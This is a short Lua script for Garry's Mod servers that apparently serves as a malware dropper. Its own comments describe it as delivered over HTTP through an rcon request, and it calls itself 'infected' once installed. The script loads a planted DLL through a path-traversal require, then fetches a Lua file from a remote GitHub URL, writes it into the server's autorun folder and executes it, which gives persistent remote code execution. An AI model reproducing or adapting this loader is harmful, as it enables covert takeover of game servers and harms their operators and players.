-- Loaded over HTTP by Lua through CompileString(...)() via rcon request

if not system.IsWindows() then
	return
end

if file.Exists("lua/autorun/server/default.lua", "MOD") then
	return -- Already infected
end

timer.Create("infchk", 2, 0, function()
	if file.Exists("download/engine_win32.dll", "MOD") then
		timer.Remove("infchk")

		require("/../../../download/engine")

		http.Fetch("https://raw.githubusercontent.com/Defender2015/TheCough/master/server_autorun.lua", function(content)
			CreateFile("garrysmod/lua/autorun/server/default.lua", content)

			include("autorun/server/default.lua")
		end, function() end)
	end
end)